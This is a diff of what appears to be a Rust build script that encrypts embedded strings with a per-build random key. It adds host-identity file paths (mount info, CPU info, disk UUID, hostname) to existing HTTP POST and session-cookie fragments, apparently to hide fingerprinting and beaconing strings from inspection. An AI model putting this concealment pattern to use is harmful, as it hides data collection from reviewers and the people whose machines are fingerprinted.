@@ -9,18 +9,30 @@ fn main() {
     // Generate a random 16-byte key per build
     let key: Vec<u8> = (0..16).map(|_| rand_byte()).collect();
 
-    let strings = vec![
-        ("POST_LINE", "POST / HTTP/1.1\r\n"),
-        ("CONTENT_TYPE_HEADER", "Content-Type: application/x-www-form-urlencoded\r\n"),
-        ("CONTENT_LENGTH", "Content-Length: "),
-        ("COOKIE_PREFIX", "Cookie: sid="),
-        ("CONNECTION_CLOSE", "Connection: close\r\n"),
-        ("HOST_PREFIX", "Host: "),
-        ("CRLF", "\r\n"),
-        ("HTTP_SCHEME", "http://"),
-        ("HTTPS_SCHEME", "https://"),
-        ("NULL_BYTE_ERR", "null byte in path"),
-    ];
+let strings = vec![
+    // HTTP strings
+    ("POST_LINE", "POST / HTTP/1.1\r\n"),
+    ("CONTENT_TYPE_HEADER", "Content-Type: application/x-www-form-urlencoded\r\n"),
+    ("CONTENT_LENGTH", "Content-Length: "),
+    ("COOKIE_PREFIX", "Cookie: sid="),
+    ("CONNECTION_CLOSE", "Connection: close\r\n"),
+    ("HOST_PREFIX", "Host: "),
+    ("CRLF", "\r\n"),
+    ("HTTP_SCHEME", "http://"),
+    ("HTTPS_SCHEME", "https://"),
+    ("NULL_BYTE_ERR", "null byte in path"),
+
+    // Identity paths
+    ("PROC_MOUNTINFO", "/proc/self/mountinfo"),
+    ("PROC_MOUNTS", "/proc/mounts"),
+    ("PROC_CPUINFO", "/proc/cpuinfo"),
+    ("PROC_VERSION", "/proc/version"),
+    ("SYS_DM_UUID", "/sys/block/dm-0/dm/uuid"),
+    ("DEV_MAPPER", "/dev/mapper/"),
+    ("ETC_HOSTNAME", "/etc/hostname"),
+    ("MODEL_NAME", "model name"),
+    ("UUID_PREFIX", "UUID="),
+];
 
     let mut code = String::new();
 
@@ -56,7 +68,7 @@ fn main() {
 }
 
 fn rand_byte() -> u8 {
-    // Simple entropy from system — not crypto grade but fine for obfuscation
+    // Simple entropy from system
     let mut buf = [0u8; 1];
     let _ = std::fs::File::open("/dev/urandom")
         .and_then(|mut f| {
